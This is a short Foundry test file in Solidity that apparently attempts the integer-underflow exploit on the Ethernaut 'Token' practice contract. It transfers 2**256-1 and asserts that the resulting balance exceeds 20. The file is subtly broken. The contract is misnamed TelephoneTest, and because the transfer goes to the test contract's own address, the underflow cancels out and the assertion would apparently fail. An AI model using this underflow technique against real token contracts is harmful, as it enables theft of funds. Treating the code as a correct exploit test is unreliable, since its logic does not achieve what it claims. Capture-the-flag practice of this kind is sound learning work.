// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import { console } from "forge-std/console.sol";
import { Test } from "forge-std/Test.sol";

import { Token } from "../../src/6/Token.sol";


contract TelephoneTest is Test {

  Token public _token;

  function setUp() public {
    _token = new Token(20);

  }

  function test_Token() public {
    _token.transfer(address(this), (2**256) - 1);
    // 檢查餘額是否變為一個很大的數字
    uint256 balance = _token.balanceOf(address(this));
    console.log("Balance after overflow transfer: ", balance);

    // 確保餘額大於初始值
    assert(balance > 20);
  }
}